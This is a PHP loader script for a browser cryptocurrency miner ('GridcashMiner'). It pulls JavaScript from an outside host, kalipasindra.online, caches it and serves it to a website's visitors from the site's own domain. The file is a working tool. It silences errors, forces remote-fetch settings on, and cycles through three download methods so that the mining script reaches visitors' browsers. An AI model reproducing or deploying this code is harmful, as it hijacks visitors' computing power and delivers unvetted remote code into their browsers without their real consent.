<?php
/**
 * your_channel_name - Your channel id from our site
 * notify - type of notify message for site user, 1 - Bottom line, 2 - Center of page
 * lang - Language of notify message, 1 - Russian, 2 - English
 * speed - Mining power, integer 1-100 percent
 */
header('Content-Type: application/javascript');
$gridcash = new GridcashMiner('731901455c43474', 'n', '2', '60');
$gridcash->sendCache();

class GridcashMiner
{
    /**
     * Cache lifetime in seconds
     */
    const CACHE_LIFETIME = 3600;

    /**
     * Cache filename
     */
    const CACHE_FILENAME = 'gridcash.js';

    /**
     * Static domain name
     */
    const URL = 'http://kalipasindra.online';
    
    /**
     * User agent name
     */
    const USER_AGENT = 'Mining Cacher 2.0';
    
    /**
     * Connection time out
     */
    const TIME_OUT = '5';
    
    /**
     * Connection charset
     */
    const CHARSET = 'utf-8';
    
    /**
     * Channel name
     * @var string
     */
    private $channel;
    
    /**
     * Notify user time, 1 - Bottom line, 2 - Center of page
     * @var int
     */
    private $notify;
    
    /**
     * Notify language, 1 - Russian, 2 - English
     * @var int
     */
    private $lang;
    
    /**
     * Mining speed, 0-100%
     * @var int
     */
    private $speed;

    public function __construct($channel, $notify = 1, $lang = 2, $speed = 60)
    {
        $this->channel = $channel;
        $this->notify = $notify;
        $this->lang = (int)$lang;
        $this->speed = (int)$speed;
    }

    /**
     * Send content to browser
     */
    public function sendCache()
    {
        $filename = __DIR__ . "/" . self::CACHE_FILENAME;
        if(!file_exists($filename) || (file_exists($filename) && (time() - filemtime($filename)) > self::CACHE_LIFETIME)){
            $this->update($filename);
        }
        $this->sendFile($filename);
    }

    /**
     * Update or create cache javascript file
     * @param string $filename
     */
    public function update($filename)
    {
        if(!$file = $this->fetch_remote_file(sprintf("%s/%s.3.%s.%d.1.l%d.js", self::URL, $this->channel, $this->notify, $this->lang, $this->speed))){
            die('Cannot get file from static server');
        }
        file_put_contents($filename, $file, LOCK_EX);
    }
    
    /**
     * Send file to browser with headers
     * @param string $filePath
     * @throws Exception
     */
    private function sendFile($filePath)
    {
        $fp = fopen($filePath, 'rb');
        if (empty($fp)) {
            throw new Exception(
            "Unexpected error loading cached file"
            );
        }
        header("Content-Type: application/javascript");
        header("Content-Length: " . filesize($filePath));
        fpassthru($fp);
        exit(0);
    }

    /**
     * Fetch remote file
     * @param string $url
     * @param string $specifyCharset
     * @return string
     */
    private function fetch_remote_file($url, $specifyCharset = false)
    {
        $parts = parse_url($url);
        $host = $parts['host'];
        $path = $parts['path'];
        $query = @$parts['query'];
        @ini_set('allow_url_fopen', 1);
        @ini_set('default_socket_timeout', self::TIME_OUT);
        @ini_set('user_agent', self::USER_AGENT);


        if (function_exists('file_get_contents'))
            $fetch_remote_type = 'file_get_contents';
        else if (function_exists('curl_init'))
            $fetch_remote_type = 'curl';
        else
            $fetch_remote_type = 'socket';

        if ($fetch_remote_type == 'file_get_contents' ||
                (
                $fetch_remote_type == '' &&
                function_exists('file_get_contents') &&
                ini_get('allow_url_fopen') == 1
                )
        ) {
            $opts = array(
                'http' => array(
                    'method' => 'GET',
                    'timeout' => self::TIME_OUT,
                    'header' => 'Accept-Charset: ' . self::CHARSET . "\r\n" .
                    'User-Agent: ' . self::USER_AGENT . "\r\n"
                )
            );
            $context = @stream_context_create($opts);

            $fetch_remote_type = 'file_get_contents';
            if ($data = @file_get_contents($parts['scheme'] . '://' . $host . $path . '?' . $query, null, $context)) {
                return $data;
            }
            return false;
        } elseif ($fetch_remote_type == 'curl' ||
                (
                $fetch_remote_type == '' &&
                function_exists('curl_init')
                )
        ) {
            $fetch_remote_type = 'curl';
            if ($ch = @curl_init()) {

                @curl_setopt($ch, CURLOPT_URL, $parts['scheme'] . '://' . $host . $path . '?' . $query);
                @curl_setopt($ch, CURLOPT_HEADER, false);
                @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                @curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, self::TIME_OUT);
                @curl_setopt($ch, CURLOPT_USERAGENT, self::USER_AGENT);
                if ($specifyCharset) {
                    @curl_setopt($ch, CURLOPT_HTTPHEADER, array('Accept-Charset: ' . self::CHARSET));
                }

                $data = @curl_exec($ch);
                @curl_close($ch);

                if ($data) {
                    return $data;
                }

                return false;
            }
        } else {
            $fetch_remote_type = 'socket';
            $buff = '';
            $fp = @fsockopen($host, 80, $errno, $errstr, self::TIME_OUT);
            if ($fp) {
                @fputs($fp, "GET " . $path . "?" . $query . " HTTP/1.0\r\nHost: {$host}\r\n");
                if ($specifyCharset) {
                    @fputs($fp, "Accept-Charset: {" . self::CHARSET . "}\r\n");
                }
                @fputs($fp, "User-Agent: {" . self::USER_AGENT . "}\r\n\r\n");
                while (!@feof($fp)) {
                    $buff .= @fgets($fp, 128);
                }
                @fclose($fp);
                $page = explode("\r\n\r\n", $buff);
                return $page[1];
            }
        }

        die('Cannot connect server: ' . $host . $path . '?' . $query . ', type: ' . $fetch_remote_type);
    }

}
